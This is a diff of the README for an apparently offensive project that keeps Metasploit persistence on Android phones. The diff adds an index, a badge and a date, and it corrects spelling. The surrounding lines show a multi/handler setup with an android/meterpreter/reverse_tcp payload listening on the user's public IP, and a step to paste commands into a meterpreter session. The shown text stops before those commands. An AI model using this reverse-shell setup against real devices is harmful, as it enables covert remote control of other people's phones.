@@ -5,10 +5,24 @@
 
 ## INDEX
 
-- [Introduction](#INTRODUCTION)
-- [Prerequisites](#PREREQUISITESITES)
-- [Use](#USE)
-- [License](#LICENSE)
+- [MSF PERSISTANCE ANDROID](#msf-persistance-android)
+  - [INDEX](#index)
+  - [BADGES](#badges)
+  - [FIRST UPDATE](#first-update)
+  - [INTRODUCTION](#introduction)
+  - [PREREQUISITES](#prerequisites)
+  - [USE](#use)
+  - [LICENSE](#license)
+
+
+## BADGES
+
+[![pipeline status](https://gitlab.com/oda-alexandre/msf-persistance-android/badges/master/pipeline.svg)](https://gitlab.com/oda-alexandre/msf-persistance-android/commits/master)
+
+
+## FIRST UPDATE
+
+Date: 01-01-01
 
 
 ## INTRODUCTION
@@ -32,12 +46,12 @@ Use [Metasploit](https://www.metasploit.com/)
 use exploit/multi/handler
 set payload android/meterpreter/reverse_tcp
 set lhost YOUR IP PUBLIC
-set lport THE PORT OF YOUR CHOIX
+set lport THE PORT OF YOUR CHOICE
 exploit
 ```
 
 
-3 - Copier/Paste in a terminal in shell MSF with a session android/meterpreter/reverse_tcp
+3 - Copie/Paste in a terminal in shell MSF with a session android/meterpreter/reverse_tcp
 
 ```
 cd /
